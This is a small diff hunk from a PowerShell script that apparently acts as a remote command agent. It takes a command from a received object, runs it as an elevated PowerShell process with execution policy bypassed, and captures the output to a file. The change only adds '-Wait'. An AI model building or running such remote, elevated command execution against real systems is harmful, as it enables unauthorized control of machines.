@@ -75,7 +75,7 @@
       $messagetype = "info"
       $data = "ps"
       $pscommand = $command.result.exec -split "ps ",""
-      Start-Process "powershell" -ArgumentList "-executionpolicy bypass -command `"$pscommand`"" -Verb RunAs | Tee-Object ".\build\txt\getcommand.txt" | Out-Null
+      Start-Process "powershell" -ArgumentList "-executionpolicy bypass -command `"$pscommand`"" -Verb RunAs -Wait | Tee-Object ".\build\txt\getcommand.txt" | Out-Null
       $getpayload = Get-Content ".\build\txt\getcommand.txt"
       $line = @()
       $getpayload | foreach {$line += "$_`n"}
